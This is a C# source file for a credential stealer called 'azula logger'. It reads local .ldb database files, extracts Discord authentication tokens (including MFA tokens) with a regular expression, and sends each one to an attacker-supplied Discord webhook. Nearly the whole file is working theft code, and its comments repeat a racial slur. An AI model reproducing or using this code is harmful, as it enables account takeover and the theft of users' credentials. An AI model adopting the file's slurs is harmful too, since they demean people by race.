using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace azula_logger
{
    class TokenGetter
    {
        public static void GetToken(string Folder, string Filetype, string webhook, string image)
        {
            try
            {
            //Basic shit to get all the files in the dir that end with .ldb and thats where the token is stored
            DirectoryInfo dinfo = new DirectoryInfo(Folder);
            FileInfo[] Files = dinfo.GetFiles(Filetype);
            foreach (FileInfo file in Files)
            {
                //nigger shit for getting tokens
                var text = File.ReadAllText(file.FullName);
                
                //more nigger shit for getting the token
                string token_reg =
                   @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}";
                Match token = Regex.Match(text, token_reg);


                //sending webhook + waiting so u dont get an error
                if(token.ToString() == "")
                {
                    //This is just here so it doesnt send an emty message
                }
                else
                {
                    websend.sendDiscordWebhook(webhook, "azula logger", token.ToString() + "\n -------------------------", image);
                    Thread.Sleep(100);
                }
            }
            }
            catch { }
        }

    }
}
